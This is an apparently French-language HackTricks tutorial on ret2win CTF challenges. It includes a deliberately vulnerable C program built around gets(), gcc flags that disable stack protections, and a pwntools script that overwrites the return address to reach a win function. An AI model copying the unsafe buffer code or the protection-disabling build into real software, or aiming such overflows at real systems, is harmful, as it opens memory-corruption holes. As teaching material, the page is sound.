# Ret2win

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informations de base

Les d√©fis **Ret2win** sont une cat√©gorie populaire dans les comp√©titions **Capture The Flag (CTF)**, en particulier dans les t√¢ches impliquant **l'exploitation binaire**. L'objectif est d'exploiter une vuln√©rabilit√© dans un binaire donn√© pour ex√©cuter une fonction sp√©cifique, non invoqu√©e, au sein du binaire, souvent nomm√©e quelque chose comme `win`, `flag`, etc. Cette fonction, lorsqu'elle est ex√©cut√©e, imprime g√©n√©ralement un drapeau ou un message de succ√®s. Le d√©fi implique g√©n√©ralement de remplacer l'**adresse de retour** sur la pile pour d√©tourner le flux d'ex√©cution vers la fonction souhait√©e. Voici une explication plus d√©taill√©e avec des exemples :

### Exemple C

Consid√©rons un simple programme C avec une vuln√©rabilit√© et une fonction `win` que nous avons l'intention d'appeler :
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Pour compiler ce programme sans protections de pile et avec **ASLR** d√©sactiv√©, vous pouvez utiliser la commande suivante :
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Compiler le programme en tant que binaire 32 bits (c'est optionnel mais courant dans les d√©fis CTF).
* `-fno-stack-protector`: D√©sactiver les protections contre les d√©bordements de pile.
* `-z execstack`: Autoriser l'ex√©cution de code sur la pile.
* `-no-pie`: D√©sactiver l'ex√©cutable ind√©pendant de la position pour s'assurer que l'adresse de la fonction `win` ne change pas.
* `-o vulnerable`: Nommer le fichier de sortie `vulnerable`.

### Exploit Python utilisant Pwntools

Pour l'exploit, nous utiliserons **pwntools**, un puissant framework CTF pour √©crire des exploits. Le script d'exploit cr√©era un payload pour d√©border le tampon et √©craser l'adresse de retour avec l'adresse de la fonction `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Pour trouver l'adresse de la fonction `win`, vous pouvez utiliser **gdb**, **objdump** ou tout autre outil qui vous permet d'inspecter des fichiers binaires. Par exemple, avec `objdump`, vous pourriez utiliser :
```sh
objdump -d vulnerable | grep win
```
Cette commande vous montrera l'assemblage de la fonction `win`, y compris son adresse de d√©part.&#x20;

Le script Python envoie un message soigneusement con√ßu qui, lorsqu'il est trait√© par la `vulnerable_function`, d√©borde le tampon et √©crase l'adresse de retour sur la pile avec l'adresse de `win`. Lorsque `vulnerable_function` retourne, au lieu de retourner √† `main` ou de sortir, il saute √† `win`, et le message est imprim√©.

## Protections

* [**PIE**](../../common-binary-protections-and-bypasses/pie/) **doit √™tre d√©sactiv√©** pour que l'adresse soit fiable √† travers les ex√©cutions ou l'adresse o√π la fonction sera stock√©e ne sera pas toujours la m√™me et vous auriez besoin d'une fuite pour d√©terminer o√π la fonction win est charg√©e. Dans certains cas, lorsque la fonction qui cause le d√©bordement est `read` ou similaire, vous pouvez faire un **Partial Overwrite** de 1 ou 2 octets pour changer l'adresse de retour afin qu'elle soit la fonction win. En raison de la fa√ßon dont fonctionne l'ASLR, les trois derniers nibbles hexad√©cimaux ne sont pas randomis√©s, donc il y a une **chance de 1/16** (1 nibble) d'obtenir la bonne adresse de retour.
* [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/) doivent √©galement √™tre d√©sactiv√©s ou l'adresse de retour EIP compromise ne sera jamais suivie.

## Autres exemples & R√©f√©rences

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bits, pas d'ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bits avec ASLR, avec une fuite de l'adresse binaire
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bits, pas d'ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bits, pas d'ASLR, double petit d√©bordement, premier √† d√©border la pile et agrandir la taille du deuxi√®me d√©bordement
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bits, relro, pas de canary, nx, pas de pie, cha√Æne de format pour √©craser l'adresse `fflush` avec la fonction win (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bits, nx, rien d'autre, √©criture partielle de l'EIP (1 octet) pour appeler la fonction win
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bits, nx, rien d'autre, √©criture partielle de l'EIP (1 octet) pour appeler la fonction win
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Le programme ne valide que le dernier octet d'un nombre pour v√©rifier la taille de l'entr√©e, il est donc possible d'ajouter n'importe quelle taille tant que le dernier octet est dans la plage autoris√©e. Ensuite, l'entr√©e cr√©e un d√©bordement de tampon exploit√© avec un ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bits, relro, pas de canary, nx, pie. √âcriture partielle pour appeler la fonction win (ret2win)
* [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
* arm64, PIE, cela donne une fuite PIE la fonction win est en fait 2 fonctions donc gadget ROP qui appelle 2 fonctions
* [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
* ARM64, off-by-one pour appeler une fonction win

## Exemple ARM64

{% content-ref url="ret2win-arm64.md" %}
[ret2win-arm64.md](ret2win-arm64.md)
{% endcontent-ref %}

{% hint style="success" %}
Apprenez & pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez & pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
